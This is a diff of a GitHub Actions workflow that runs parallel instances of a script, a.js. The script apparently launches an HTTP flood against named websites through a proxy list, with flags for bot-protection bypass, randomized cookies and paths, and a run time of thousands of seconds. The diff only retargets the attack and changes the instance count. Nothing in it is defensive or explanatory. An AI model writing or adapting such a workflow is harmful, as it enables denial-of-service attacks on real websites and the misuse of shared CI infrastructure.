@@ -13,7 +13,7 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        instance: [1, 2]
     
     steps:
     - name: Checkout code
@@ -28,7 +28,10 @@ jobs:
       run: |
         npm init -y
         npm install hpack chalk@4
+
     
     - name: Run a.js (Instance ${{ matrix.instance }})
       run: |
-        node a.js GET https://c4.dstatbot.win/T4xD9k2J 700 1 1 proxy.txt --bfm --auth --debug --cookie "bypass=%RAND%" --delay 3
+        node a.js GET https://retrostress.net/faq 6700 1  1 proxy.txt  --bfm --auth --debug --cookie "bypass=%RAND%" --randpath 1 --delay 3 
+
+
